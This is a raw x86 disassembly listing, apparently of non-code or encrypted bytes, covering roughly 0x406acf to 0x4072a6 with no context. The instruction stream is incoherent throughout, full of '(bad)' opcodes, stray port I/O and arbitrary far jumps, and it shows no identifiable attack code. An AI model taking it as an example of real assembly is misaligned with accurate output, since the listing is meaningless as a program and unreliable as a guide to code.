  406acf:	repnz xor dh,BYTE PTR [esi+0x50]
  406ad3:	push   edx
  406ad4:	mov    esp,0x66af7d3c
  406ad9:	lahf   
  406ada:	and    ch,BYTE PTR [eax-0x4b8c23fc]
  406ae0:	mov    ds:0x745654eb,eax
  406ae5:	pusha  
  406ae6:	cs or  eax,esi
  406ae9:	dec    ebx
  406aea:	xchg   esp,eax
  406aeb:	sbb    DWORD PTR [ecx+0x65],ebx
  406aee:	xor    al,0x5a
  406af0:	push   edi
  406af1:	neg    BYTE PTR [edx-0xbc8140f]
  406af7:	inc    esi
  406af8:	test   DWORD PTR [edi-0x1d],ebx
  406afb:	loop   0x406af8
  406afd:	push   ds
  406afe:	inc    eax
  406aff:	(bad)  
  406b00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b01:	fst    QWORD PTR [ebp+0x4e9df860]
  406b07:	sub    DWORD PTR [ecx-0x64],eax
  406b0a:	fdiv   DWORD PTR [eax-0x53889f24]
  406b10:	add    esp,esp
  406b12:	xchg   ebp,eax
  406b13:	pop    edx
  406b14:	mov    bh,0xf5
  406b16:	inc    esp
  406b17:	adc    eax,0xda885de0
  406b1c:	push   eax
  406b1d:	sbb    edx,esi
  406b1f:	or     al,ch
  406b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b22:	pusha  
  406b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b24:	inc    esp
  406b25:	repnz push edi
  406b27:	mov    fs,WORD PTR [edx+0x25]
  406b2a:	test   al,0xa
  406b2c:	sbb    al,0x6d
  406b2e:	ins    DWORD PTR es:[edi],dx
  406b2f:	stos   DWORD PTR es:[edi],eax
  406b30:	sbb    DWORD PTR [eax],edi
  406b32:	mov    ah,dh
  406b34:	cdq    
  406b35:	aas    
  406b36:	jmp    0x406b04
  406b38:	cld    
  406b39:	cmc    
  406b3a:	dec    ebp
  406b3b:	lock fwait
  406b3d:	shr    BYTE PTR [esi+0x3e323b5c],0x82
  406b44:	(bad)  
  406b45:	ins    DWORD PTR es:[edi],dx
  406b46:	lods   al,BYTE PTR ds:[esi]
  406b47:	mov    bl,0x7
  406b49:	mov    dl,0xbb
  406b4b:	xchg   cl,bl
  406b4d:	push   ebx
  406b4e:	iret   
  406b4f:	xor    al,0x40
  406b51:	jns    0x406ae3
  406b53:	aad    0xd9
  406b55:	repnz mov ah,0xc9
  406b58:	or     BYTE PTR [edx+0x6a],cl
  406b5b:	add    bh,dl
  406b5d:	fsubrp st(6),st
  406b5f:	pop    edi
  406b60:	cmp    ecx,0xd5a0b12d
  406b66:	stos   DWORD PTR es:[edi],eax
  406b67:	jnp    0x406bb1
  406b69:	mov    dh,bl
  406b6b:	jmp    0xb35df36b
  406b70:	lods   al,BYTE PTR ds:[esi]
  406b71:	xor    eax,0x1d5d80db
  406b76:	nop
  406b77:	xor    al,0x6d
  406b79:	jo     0x406ba5
  406b7b:	retf   0x898d
  406b7e:	xor    eax,0x25f5d47e
  406b83:	icebp  
  406b84:	push   esi
  406b85:	mov    edx,0xb8f0b0f7
  406b8a:	jge    0x406b64
  406b8c:	sbb    BYTE PTR [ebp-0x2d],bl
  406b8f:	sub    ch,BYTE PTR [edi-0x6a18d355]
  406b95:	loop   0x406b4e
  406b97:	loope  0x406b57
  406b99:	mov    DWORD PTR [ecx],0xbae22428
  406b9f:	mov    al,0xf2
  406ba1:	fdivrp st(3),st
  406ba3:	sbb    ebp,DWORD PTR [edx]
  406ba5:	xchg   esp,eax
  406ba6:	sub    al,0x87
  406ba8:	mul    ecx
  406baa:	lock add eax,0xf8340bff
  406bb0:	nop
  406bb1:	sbb    DWORD PTR ds:0xbf8fea8e,ebx
  406bb7:	jge    0x406b45
  406bb9:	adc    DWORD PTR [esi+eiz*1+0x2cb4ed4],ebx
  406bc0:	inc    ecx
  406bc1:	inc    ebx
  406bc2:	jle    0x406ba9
  406bc4:	retf   
  406bc5:	mov    ecx,0xe3cd68fc
  406bca:	cld    
  406bcb:	mov    ecx,0x810e13fc
  406bd0:	mov    edi,0x5ab46f7d
  406bd5:	adc    DWORD PTR [edi-0x59],0xffffffb5
  406bd9:	xchg   ecx,eax
  406bda:	and    BYTE PTR [esi-0x5529096f],cl
  406be0:	adc    eax,0x4e4d31b
  406be5:	push   ecx
  406be6:	push   ebx
  406be7:	leave  
  406be8:	cmp    dh,BYTE PTR [esi+0x5cdb19a3]
  406bee:	call   DWORD PTR [esi+0x20]
  406bf1:	sar    DWORD PTR [eax-0x5665c7f7],1
  406bf7:	ror    DWORD PTR [ebp+0x1e],0x98
  406bfb:	adc    DWORD PTR [esi+0x4c4959b5],ebp
  406c01:	push   ebx
  406c02:	daa    
  406c03:	pop    edi
  406c04:	gs nop
  406c06:	inc    ebx
  406c07:	ja     0x406c3e
  406c09:	dec    eax
  406c0a:	mov    WORD PTR fs:[esi],es
  406c0d:	fld    DWORD PTR [ecx-0x7c735a5]
  406c13:	push   ebp
  406c14:	mov    DWORD PTR [eax+0x63b89f8b],ebp
  406c1a:	aas    
  406c1b:	icebp  
  406c1c:	sbb    ebx,0xffffff92
  406c1f:	mov    edi,0xd1a28ebc
  406c24:	xchg   DWORD PTR [edx-0x19ef1a42],edi
  406c2a:	pop    es
  406c2b:	and    BYTE PTR [esi-0x28],ah
  406c2e:	adc    DWORD PTR [edi+ecx*4+0x18],ecx
  406c32:	test   al,0xaa
  406c34:	and    bl,BYTE PTR [ecx-0x5b]
  406c37:	cmp    eax,0x1cbb2a08
  406c3c:	jge    0x406c0e
  406c3e:	and    cl,BYTE PTR [edx+0x6fcb4f98]
  406c44:	mov    DWORD PTR [ebp-0x883d7d8],ecx
  406c4a:	repnz mov al,0x88
  406c4d:	adc    eax,DWORD PTR [edx+0x23]
  406c50:	inc    ebx
  406c51:	fsub   QWORD PTR [ecx+0x2ba4c1d3]
  406c57:	sahf   
  406c58:	pop    ebp
  406c59:	aas    
  406c5a:	sub    DWORD PTR [ebx-0x4e543a38],ecx
  406c60:	test   BYTE PTR [ebx+0x1e],ch
  406c63:	jns    0x406cb4
  406c65:	rol    ebp,0x9f
  406c68:	dec    ecx
  406c69:	xlat   BYTE PTR ds:[ebx]
  406c6a:	mov    esi,0x6ea4ad5c
  406c6f:	xor    esi,ecx
  406c71:	es (bad) 
  406c73:	ror    BYTE PTR [ebx+0x17],cl
  406c76:	xor    al,0x1e
  406c78:	and    bl,BYTE PTR [edx]
  406c7a:	inc    ebp
  406c7b:	pop    esp
  406c7c:	or     eax,0x8c7060cd
  406c81:	inc    esi
  406c82:	mov    DWORD PTR [ebx],ecx
  406c84:	xchg   BYTE PTR [esi-0x3f],al
  406c87:	add    BYTE PTR [esp+esi*1-0x4d],0x82
  406c8c:	sbb    BYTE PTR [edi-0x1b],dl
  406c8f:	or     eax,0x5d9ca06d
  406c94:	enter  0x8a27,0x86
  406c98:	aaa    
  406c99:	adc    eax,0x3ed7c3c4
  406c9e:	push   esp
  406c9f:	out    0x27,eax
  406ca1:	test   bh,cl
  406ca3:	inc    ebx
  406ca4:	call   0xf0da:0x25c37ab6
  406cab:	pop    es
  406cac:	neg    BYTE PTR [edx]
  406cae:	stc    
  406caf:	push   0x9230d136
  406cb4:	hlt    
  406cb5:	cdq    
  406cb6:	xchg   esi,eax
  406cb7:	std    
  406cb8:	xor    edx,esp
  406cba:	mov    cl,cl
  406cbc:	pop    esp
  406cbd:	or     dh,BYTE PTR [edx+0x68]
  406cc0:	xchg   edx,eax
  406cc1:	add    dl,BYTE PTR [esi+eiz*8-0x5224d88b]
  406cc8:	out    0x6,eax
  406cca:	pop    esp
  406ccb:	mov    ds:0xea9bbe4d,eax
  406cd0:	aaa    
  406cd1:	aas    
  406cd2:	inc    ecx
  406cd3:	rcr    dh,0xab
  406cd6:	fcmovnu st,st(3)
  406cd8:	pop    esp
  406cd9:	xor    BYTE PTR [ebx+0xf],0x5
  406cdd:	dec    ebx
  406cde:	mov    BYTE PTR [edi+0x5609c2dd],ch
  406ce4:	mov    dh,0x8c
  406ce6:	xchg   eax,esi
  406ce8:	push   ds
  406ce9:	daa    
  406cea:	push   ds
  406ceb:	nop
  406cec:	jae    0x406d19
  406cee:	fsubrp st(0),st
  406cf0:	mov    edx,DWORD PTR [esi]
  406cf2:	inc    ebx
  406cf3:	pop    es
  406cf4:	hlt    
  406cf5:	das    
  406cf6:	dec    eax
  406cf7:	xchg   edx,eax
  406cf8:	jmp    0x2ae5:0x1b8809ae
  406cff:	cdq    
  406d00:	je     0x406d20
  406d02:	jecxz  0x406d49
  406d04:	out    0x17,al
  406d06:	mov    cl,0xc6
  406d08:	addr16 aas 
  406d0a:	sbb    al,0x58
  406d0c:	std    
  406d0d:	pop    ds
  406d0e:	xor    dh,BYTE PTR ds:0xb0a8bca0
  406d14:	jmp    0x406cea
  406d16:	pop    eax
  406d17:	add    ebx,DWORD PTR [eax-0x40]
  406d1a:	out    0xc,al
  406d1c:	push   ebp
  406d1d:	xchg   edx,eax
  406d1e:	add    eax,0x9ad85fa8
  406d23:	add    dl,BYTE PTR [eax+0x2733c8c1]
  406d29:	mov    esi,0xd3b4f96f
  406d2e:	add    DWORD PTR [ebx],eax
  406d30:	push   ecx
  406d31:	push   ds
  406d32:	inc    esp
  406d33:	cwde   
  406d34:	popa   
  406d35:	push   edx
  406d36:	push   edi
  406d37:	mov    al,ds:0xbc7044c1
  406d3c:	mov    bl,0x53
  406d3e:	push   edx
  406d3f:	mov    ah,0x8
  406d41:	sbb    eax,0xf756e3a4
  406d46:	popa   
  406d47:	push   ds
  406d48:	repnz mov ch,al
  406d4b:	stos   BYTE PTR es:[edi],al
  406d4c:	test   eax,0xce6596b4
  406d51:	push   ss
  406d52:	inc    eax
  406d53:	mov    ds:0x25849f40,al
  406d58:	mov    ecx,DWORD PTR [esi-0x4b]
  406d5b:	test   edx,0xd91d9c29
  406d61:	jmp    0x4777:0x246973ae
  406d68:	xor    al,0xd2
  406d6a:	int    0x41
  406d6c:	and    cl,bl
  406d6e:	dec    esi
  406d6f:	retf   
  406d70:	stos   BYTE PTR es:[edi],al
  406d71:	cli    
  406d72:	inc    esi
  406d73:	add    ecx,0xe9c15df1
  406d79:	or     al,0x5a
  406d7b:	adc    DWORD PTR ds:0x4762f946,0xecac155f
  406d85:	mov    ah,0x49
  406d87:	fcom   DWORD PTR [ecx-0x198339f0]
  406d8d:	xchg   bh,al
  406d8f:	in     eax,0x5c
  406d91:	cmp    DWORD PTR [edi-0x70b6f2b],ebx
  406d97:	xor    al,0x49
  406d99:	data16 sbb al,0xb1
  406d9c:	mov    BYTE PTR [edi],bh
  406d9e:	mov    al,0xa
  406da0:	dec    edi
  406da1:	outs   dx,DWORD PTR ds:[esi]
  406da2:	lahf   
  406da3:	or     DWORD PTR [ebx-0x22],esp
  406da6:	mov    ah,0xad
  406da8:	xchg   edi,eax
  406da9:	inc    edi
  406daa:	cld    
  406dab:	sbb    bl,BYTE PTR [eax+0x51]
  406dae:	dec    esp
  406daf:	icebp  
  406db0:	fld    DWORD PTR [edx-0x5d]
  406db3:	push   eax
  406db4:	ret    0x74ac
  406db7:	out    dx,eax
  406db8:	jae    0x406d60
  406dba:	push   0x13f8c23a
  406dbf:	or     ecx,DWORD PTR [ecx+0x156e4373]
  406dc5:	sbb    eax,0x611d8604
  406dca:	mov    esp,DWORD PTR [edx-0x7b]
  406dcd:	mov    bh,0x10
  406dcf:	popa   
  406dd0:	xchg   esp,eax
  406dd1:	clc    
  406dd2:	xor    BYTE PTR [ebp-0x1b],bl
  406dd5:	iret   
  406dd6:	dec    eax
  406dd7:	push   0x623d9f68
  406ddc:	and    BYTE PTR [ecx-0x5115a223],ch
  406de2:	push   esi
  406de3:	test   BYTE PTR [edi],dl
  406de5:	inc    ecx
  406de6:	and    BYTE PTR [edi],bl
  406de8:	mov    dl,0x3a
  406dea:	int    0x5d
  406dec:	(bad)  
  406dee:	adc    al,0x14
  406df0:	lea    ebp,[ebp+0x7edfdfa]
  406df6:	loope  0x406e28
  406df8:	ror    bl,cl
  406dfa:	jae    0x406e0f
  406dfc:	push   edx
  406dfd:	jge    0x406e45
  406dff:	in     al,dx
  406e00:	add    DWORD PTR [eax],ebx
  406e02:	jmp    0x9c5c62d
  406e07:	mov    al,ds:0x7e5a8084
  406e0c:	popf   
  406e0d:	adc    eax,0xcc8c962a
  406e12:	addr16 (bad) 
  406e15:	pop    eax
  406e16:	sbb    eax,0x94b95ba4
  406e1b:	inc    ebp
  406e1c:	cmp    DWORD PTR [edx+esi*4+0xa9a8b67],edx
  406e23:	clc    
  406e24:	sbb    bl,BYTE PTR [ecx]
  406e26:	cmp    bh,BYTE PTR [esi]
  406e28:	and    bl,BYTE PTR [ebx]
  406e2a:	loopne 0x406dbc
  406e2c:	jge    0x406e05
  406e2e:	jecxz  0x406e27
  406e30:	pushf  
  406e31:	ret    
  406e32:	(bad)  
  406e33:	push   edi
  406e34:	jb     0x406e74
  406e36:	out    0x42,al
  406e38:	mov    al,ds:0xfe22ed08
  406e3d:	adc    BYTE PTR [eax-0x80],dh
  406e40:	inc    edi
  406e41:	sbb    BYTE PTR [edi],ah
  406e43:	and    esi,DWORD PTR [eax-0x1f]
  406e46:	or     eax,0x70f54df8
  406e4b:	xchg   dh,ch
  406e4d:	xchg   BYTE PTR [edi*1-0x6ed57b29],dh
  406e54:	(bad)  
  406e55:	cld    
  406e56:	(bad)  
  406e57:	out    dx,eax
  406e58:	mov    ah,0x6e
  406e5a:	call   DWORD PTR [eax]
  406e5c:	mov    dl,0xe0
  406e5e:	sub    dl,BYTE PTR [ecx]
  406e60:	pop    ecx
  406e61:	mov    ecx,0xe4ea6eed
  406e66:	jmp    0x406eb2
  406e68:	into   
  406e69:	imul   edx,esp,0x468dd4c5
  406e6f:	and    eax,0x76aa41a0
  406e74:	mov    cl,0x79
  406e76:	inc    esp
  406e77:	adc    eax,0xc1a93710
  406e7c:	add    DWORD PTR [edx-0x6],0xfffffff9
  406e80:	push   ecx
  406e81:	pop    ebx
  406e82:	aam    0x36
  406e84:	imul   ebp,DWORD PTR [esi-0x33],0x4a6ed4bb
  406e8b:	(bad)  
  406e8c:	(bad)  
  406e8d:	cmp    eax,0x70d0eabe
  406e92:	and    BYTE PTR es:[ebx-0x2],al
  406e96:	loop   0x406eda
  406e98:	ror    ch,cl
  406e9a:	and    eax,0x34b9ca7c
  406e9f:	mov    bl,0xf9
  406ea1:	xor    BYTE PTR [ebx+edi*8],cl
  406ea4:	repz push edx
  406ea6:	mov    ch,bl
  406ea8:	(bad)  
  406ea9:	xchg   ebp,eax
  406eaa:	mov    edi,0x8605a3e5
  406eaf:	cmp    esp,ebp
  406eb1:	scas   al,BYTE PTR es:[edi]
  406eb2:	mov    ds:0xf550dcd7,eax
  406eb7:	mov    ds:0x910a872e,eax
  406ebc:	jmp    DWORD PTR [ecx]
  406ebe:	and    dl,ah
  406ec0:	stc    
  406ec1:	mov    esi,0xaa97665e
  406ec6:	pushf  
  406ec7:	adc    eax,0xe7429181
  406ecc:	int3   
  406ecd:	ret    
  406ece:	pusha  
  406ecf:	cmp    ecx,edx
  406ed1:	fidiv  WORD PTR [edi]
  406ed3:	mov    esp,0xfea42b78
  406ed8:	sub    eax,0xdbd7d525
  406edd:	sub    DWORD PTR [edx+ebx*1-0x6],ebx
  406ee1:	inc    ebp
  406ee2:	cmp    DWORD PTR [esi+0x4d],0x30a7dd98
  406ee9:	adc    BYTE PTR [eax],bl
  406eeb:	inc    esi
  406eec:	dec    esp
  406eed:	xor    ch,0xa4
  406ef0:	fldenv [edx+0x7c82282c]
  406ef6:	imul   edi
  406ef8:	out    0x2b,al
  406efa:	pop    esi
  406efb:	nop
  406efc:	pop    edi
  406efd:	pop    ss
  406efe:	lods   eax,DWORD PTR ds:[esi]
  406eff:	je     0x406eab
  406f01:	imul   edx,DWORD PTR [esi],0xffffff91
  406f04:	fidiv  DWORD PTR ss:[edx+0x22]
  406f08:	add    eax,0x7f03a799
  406f0d:	jp     0x406ef5
  406f0f:	icebp  
  406f10:	call   0xe1f90f78
  406f15:	lods   al,BYTE PTR ds:[esi]
  406f16:	sub    DWORD PTR [esi+0x45],0x73f883c4
  406f1d:	jo     0x406f18
  406f1f:	xchg   edi,eax
  406f20:	or     BYTE PTR [ecx+0x793d2b3f],cl
  406f26:	repnz adc bl,bl
  406f29:	retf   
  406f2a:	enter  0x7c8a,0x5d
  406f2e:	jl     0x406ed9
  406f30:	jno    0x406f59
  406f32:	mov    esi,0xa1c8533e
  406f37:	mov    esp,0x3f62e0e
  406f3c:	push   ss
  406f3d:	jg     0x406fba
  406f3f:	(bad)  
  406f40:	sub    al,BYTE PTR [eax-0x35f4baa7]
  406f46:	cmp    BYTE PTR [esi-0x75ab917d],cl
  406f4c:	aas    
  406f4d:	pop    esp
  406f4e:	xchg   edx,eax
  406f4f:	jmp    0x9d2f55ea
  406f54:	jne    0x406f5b
  406f56:	mov    dh,0x5f
  406f58:	(bad)  
  406f59:	iret   
  406f5a:	xchg   edi,eax
  406f5b:	call   0xde34468b
  406f60:	int3   
  406f61:	test   BYTE PTR [eax],dl
  406f63:	test   BYTE PTR [edx],cl
  406f65:	push   cs
  406f66:	je     0x406f83
  406f68:	mov    eax,DWORD PTR [ecx-0xc]
  406f6b:	aaa    
  406f6c:	mov    dl,0x1
  406f6e:	add    dh,BYTE PTR [esi-0x528abd28]
  406f74:	jle    0x406fa3
  406f76:	push   ebp
  406f77:	(bad)  
  406f78:	jg     0x406f9b
  406f7a:	cld    
  406f7b:	test   eax,0xb74ece8a
  406f80:	push   edi
  406f81:	outs   dx,BYTE PTR ds:[esi]
  406f82:	jnp    0x406f5e
  406f84:	jge    0x406fc8
  406f86:	sub    ebp,DWORD PTR [ebp-0x4433ea32]
  406f8c:	mov    ebx,0x9dedd8b6
  406f91:	retf   0xabea
  406f94:	lahf   
  406f95:	scas   al,BYTE PTR es:[edi]
  406f96:	mov    BYTE PTR [ebx+0x1133bd41],bh
  406f9c:	push   esi
  406f9d:	iret   
  406f9e:	aas    
  406f9f:	ins    DWORD PTR es:[edi],dx
  406fa0:	test   ah,bh
  406fa2:	adc    ch,bl
  406fa4:	(bad)  
  406fa6:	jle    0x406f28
  406fa8:	pop    edi
  406fa9:	xor    al,0x29
  406fab:	add    dh,BYTE PTR [ebx-0x718cbb90]
  406fb1:	sbb    ecx,DWORD PTR [eax]
  406fb3:	push   ebx
  406fb4:	or     ah,bl
  406fb6:	jp     0x407024
  406fb8:	mov    DWORD PTR [ecx],ecx
  406fba:	ins    DWORD PTR es:[edi],dx
  406fbb:	int3   
  406fbc:	js     0x406f46
  406fbe:	inc    ecx
  406fbf:	scas   eax,DWORD PTR es:[edi]
  406fc0:	inc    edi
  406fc1:	xchg   esp,eax
  406fc2:	ds pushf 
  406fc4:	jnp    0x406f4c
  406fc6:	mov    cs,edx
  406fc8:	arpl   WORD PTR [edx],sp
  406fca:	cwde   
  406fcb:	out    dx,eax
  406fcc:	push   ecx
  406fcd:	jbe    0x407040
  406fcf:	sbb    al,0xd8
  406fd1:	daa    
  406fd2:	push   esp
  406fd3:	out    dx,eax
  406fd4:	sub    esi,DWORD PTR [edx+edi*4+0xa]
  406fd8:	fimul  DWORD PTR [edi]
  406fda:	mov    bh,0xd3
  406fdc:	and    DWORD PTR [eax+0x5dd681d0],ecx
  406fe2:	aam    0x85
  406fe4:	ins    DWORD PTR es:[edi],dx
  406fe5:	enter  0xa55f,0x6e
  406fe9:	adc    eax,0x19824027
  406fee:	enter  0xb1e6,0xca
  406ff2:	mov    ds:0x84bd171b,eax
  406ff7:	cmovns esp,DWORD PTR [eax+0x3fe20f6c]
  406ffe:	pushf  
  406fff:	retf   0xc6fc
  407002:	sbb    eax,0xa3f2a2ae
  407007:	js     0x407006
  407009:	retf   
  40700a:	hlt    
  40700b:	xchg   esi,eax
  40700c:	ror    BYTE PTR [edi-0x3c],1
  40700f:	adc    eax,0xc3fa6368
  407014:	pusha  
  407015:	mov    esp,0x3cc1130a
  40701a:	jmp    0xd421:0x83c3648
  407021:	add    al,0xdf
  407023:	push   ecx
  407024:	add    DWORD PTR [ecx+0xd],0xffffffd9
  407028:	xor    eax,0x8aad3c91
  40702d:	add    eax,0x553bdc7f
  407032:	stos   BYTE PTR es:[edi],al
  407033:	int3   
  407034:	test   eax,0xa24820ff
  407039:	rcr    BYTE PTR [edi+0x61fe0163],cl
  40703f:	and    al,0x89
  407041:	in     al,dx
  407042:	or     al,0x99
  407044:	rol    bh,0xdf
  407047:	test   DWORD PTR [ebp-0x15],0x427a5a94
  40704e:	adc    eax,0xb91b136a
  407053:	cmp    esi,DWORD PTR [edx+0x2570db3c]
  407059:	push   cs
  40705a:	adc    DWORD PTR [eax],esi
  40705c:	rol    DWORD PTR [esi+0x353e27b4],cl
  407062:	std    
  407063:	repnz pushf 
  407065:	not    DWORD PTR [edx-0x5f]
  407068:	sbb    dh,BYTE PTR [eax]
  40706a:	addr16 jo 0x406ff8
  40706d:	mov    edi,0xb7dc4658
  407072:	mov    ebx,0x5779edd2
  407077:	(bad)  
  407078:	fild   WORD PTR [ebx]
  40707a:	retf   
  40707b:	std    
  40707c:	fmulp  st(0),st
  40707e:	fs mov al,0xd3
  407081:	push   0x3e8eb513
  407086:	fmul   DWORD PTR [ebx]
  407088:	or     al,0xe9
  40708a:	outs   dx,DWORD PTR ds:[esi]
  40708b:	and    al,0xe9
  40708d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40708e:	fdiv   DWORD PTR [ebx-0x5a8cc645]
  407094:	test   BYTE PTR [esi],bh
  407096:	and    al,0x52
  407098:	push   edi
  407099:	jae    0x40708d
  40709b:	mov    ebx,0x6134a93a
  4070a0:	push   eax
  4070a1:	and    eax,0x19759784
  4070a6:	cmp    dh,BYTE PTR [ecx+0x383416bc]
  4070ac:	jecxz  0x4070c2
  4070ae:	std    
  4070af:	cli    
  4070b0:	xor    DWORD PTR [ebx+0x59b1fb59],edx
  4070b6:	out    dx,eax
  4070b7:	mov    ebp,0x6f7df1b3
  4070bc:	ss pop edi
  4070be:	xor    dl,BYTE PTR [esi+0x6692047a]
  4070c4:	inc    ebp
  4070c5:	adc    al,0xa
  4070c7:	in     eax,0xdf
  4070c9:	dec    esi
  4070ca:	adc    bl,BYTE PTR [ecx]
  4070cc:	or     bl,BYTE PTR [esi]
  4070ce:	xchg   ecx,eax
  4070cf:	jne    0x40710c
  4070d1:	pop    ecx
  4070d2:	pop    ebx
  4070d3:	pop    ss
  4070d4:	out    0x2e,al
  4070d6:	js     0x407145
  4070d8:	or     al,0xd
  4070da:	(bad)  
  4070db:	cmc    
  4070dc:	lea    edi,[esi]
  4070de:	cmp    eax,ebp
  4070e0:	fs dec edi
  4070e2:	push   0x402fa1a8
  4070e7:	mov    edx,0x6267966e
  4070ec:	pusha  
  4070ed:	jb     0x407125
  4070ef:	sbb    edx,DWORD PTR [edx+ecx*8-0x6c]
  4070f3:	and    BYTE PTR [ecx-0x1a],dh
  4070f6:	nop
  4070f7:	add    esp,ecx
  4070f9:	adc    al,0x2e
  4070fb:	arpl   ax,cx
  4070fd:	push   0x7e0874c6
  407102:	push   es
  407103:	or     DWORD PTR [ebx+0x11b80a52],ecx
  407109:	xor    BYTE PTR [eax+0x7ed08459],dl
  40710f:	pop    edi
  407110:	and    DWORD PTR [ecx-0x2f],0xabc213f4
  407117:	sub    DWORD PTR [edx+0xc],ecx
  40711a:	and    edi,DWORD PTR [ecx+esi*1]
  40711d:	add    al,BYTE PTR [eax+0x4a1ff4af]
  407123:	cmp    al,0x81
  407125:	dec    ecx
  407126:	pop    esi
  407127:	sub    BYTE PTR [eax-0x2e],0x65
  40712b:	push   esi
  40712c:	push   eax
  40712d:	xchg   ebp,eax
  40712e:	push   ecx
  40712f:	out    dx,al
  407130:	cmp    ebp,DWORD PTR [ebx-0x36]
  407133:	scas   al,BYTE PTR es:[edi]
  407134:	pop    esi
  407135:	mov    eax,0x1c143237
  40713a:	mov    WORD PTR [edi-0x2a9c680d],ss
  407140:	pop    esp
  407141:	stc    
  407142:	lock sbb BYTE PTR [edi-0x12fba37c],0xe8
  40714a:	rol    BYTE PTR [ecx-0x5192c1d7],cl
  407150:	xlat   BYTE PTR ds:[ebx]
  407151:	outs   dx,DWORD PTR ds:[esi]
  407152:	add    esp,DWORD PTR [esi+eax*1-0x1403955c]
  407159:	mov    eax,ds:0xbc8e453
  40715e:	scas   al,BYTE PTR es:[edi]
  40715f:	xlat   BYTE PTR ds:[ebx]
  407160:	stos   BYTE PTR es:[edi],al
  407161:	mov    eax,0xfde344e0
  407166:	xlat   BYTE PTR ds:[ebx]
  407167:	ret    0x5978
  40716a:	mov    ecx,0xfc575234
  40716f:	lods   eax,DWORD PTR ds:[esi]
  407170:	shl    dl,0x14
  407173:	pop    ecx
  407174:	push   0x103c7fe8
  407179:	jno    0x4071ae
  40717b:	iret   
  40717c:	pop    ebx
  40717d:	xchg   DWORD PTR [eax-0x29a00155],ecx
  407183:	pop    ebp
  407184:	retf   0x90ab
  407187:	out    dx,eax
  407188:	sub    DWORD PTR [ebp+edi*1-0x3],eax
  40718c:	add    cl,bh
  40718e:	or     cl,BYTE PTR [ecx]
  407190:	fisttp DWORD PTR [esi]
  407192:	out    0x67,eax
  407194:	and    BYTE PTR [ecx+0x2c],bl
  407197:	sbb    al,0x2
  407199:	xor    eax,0x91f876fb
  40719e:	mov    edx,0x1b4ed87d
  4071a3:	lods   al,BYTE PTR ds:[esi]
  4071a4:	ret    
  4071a5:	in     al,0x31
  4071a7:	repnz fisubr DWORD PTR [esi-0x70]
  4071ab:	int    0x8b
  4071ad:	scas   al,BYTE PTR es:[edi]
  4071ae:	sbb    ebp,ecx
  4071b0:	jg     0x4071f1
  4071b2:	mov    eax,ds:0x20cc6503
  4071b7:	adc    eax,DWORD PTR [ebx+0x720e1b19]
  4071bd:	jnp    0x407198
  4071bf:	loopne 0x407168
  4071c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071c2:	mov    bh,0x79
  4071c4:	mov    al,ds:0x4a586ee9
  4071c9:	sbb    al,0xaa
  4071cb:	ins    BYTE PTR es:[edi],dx
  4071cc:	std    
  4071cd:	daa    
  4071ce:	loopne 0x4071d1
  4071d0:	les    ecx,FWORD PTR [esi+eiz*8]
  4071d3:	jl     0x40724c
  4071d5:	jbe    0x4071b1
  4071d7:	or     eax,0xbcae6ea9
  4071dc:	sti    
  4071dd:	stc    
  4071de:	or     ch,BYTE PTR [edi]
  4071e0:	mov    ebp,0xee81e8c8
  4071e5:	xor    ebx,edi
  4071e7:	fisubr DWORD PTR [ecx+edx*4-0x475a3516]
  4071ee:	jbe    0x407194
  4071f0:	in     eax,dx
  4071f1:	leave  
  4071f2:	xchg   ebx,eax
  4071f3:	repz push ecx
  4071f5:	aam    0x24
  4071f7:	inc    ebx
  4071f8:	push   0x50
  4071fa:	or     DWORD PTR [edi-0x39],edx
  4071fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071fe:	xchg   edi,eax
  4071ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407200:	or     esp,DWORD PTR [edx-0x134dd199]
  407206:	rol    BYTE PTR [ebx+0x798c9456],1
  40720c:	xor    cl,BYTE PTR [ebx+eax*4+0x7c3cbc1]
  407213:	push   eax
  407214:	inc    esi
  407215:	sub    DWORD PTR [esi],0x79
  407218:	xor    BYTE PTR [esi+0x72],dl
  40721b:	add    ch,cl
  40721d:	mul    BYTE PTR [esp+ebx*2]
  407220:	mov    ecx,esi
  407222:	adc    esp,DWORD PTR [esi]
  407224:	jmp    0x40729f
  407226:	dec    esp
  407227:	xor    al,dl
  407229:	fst    QWORD PTR [eax]
  40722b:	cdq    
  40722c:	aad    0x1a
  40722e:	call   0x6f7d:0x93201cf0
  407235:	cld    
  407236:	jns    0x4071f0
  407238:	cmp    DWORD PTR [esi],eax
  40723a:	adc    esp,eax
  40723c:	ins    DWORD PTR es:[edi],dx
  40723d:	mov    ebx,0x8aed7c6
  407242:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407244:	int3   
  407245:	mov    edi,0x50c34f19
  40724a:	cli    
  40724b:	pusha  
  40724c:	inc    ebx
  40724d:	jae    0x407219
  40724f:	jnp    0x40728c
  407251:	push   esp
  407252:	dec    ebx
  407253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407254:	mov    eax,ds:0x7448d40
  407259:	sbb    DWORD PTR gs:[ebx-0x150ee81a],0x73
  407261:	and    eax,0x1ecd75ba
  407266:	mov    cl,0xdc
  407268:	shr    BYTE PTR [edx],0x9f
  40726b:	xchg   edi,eax
  40726c:	add    BYTE PTR [esi+0x73],al
  40726f:	xchg   esi,eax
  407270:	stos   DWORD PTR es:[edi],eax
  407271:	xchg   esi,eax
  407272:	dec    esp
  407273:	repnz mov eax,0x9f7cd3ac
  407279:	jg     0x4072f3
  40727b:	push   ebp
  40727c:	out    dx,eax
  40727d:	jns    0x4072e6
  40727f:	mov    ecx,DWORD PTR [ebx]
  407281:	das    
  407282:	mov    cl,0x12
  407284:	es mov edi,0xc4283808
  40728a:	adc    al,0xb1
  40728c:	jo     0x4072c6
  40728e:	inc    eax
  40728f:	xchg   edx,eax
  407290:	scas   al,BYTE PTR es:[edi]
  407291:	jmp    0x40724b
  407293:	fidivr DWORD PTR [ebx+0xe]
  407296:	fxch   st(1)
  407298:	add    al,0x1e
  40729a:	and    al,0x7e
  40729c:	mov    ah,cl
  40729e:	cmp    esp,DWORD PTR [eax-0x301968a4]
  4072a4:	jno    0x40724c
  4072a6:	out    0x37,eax
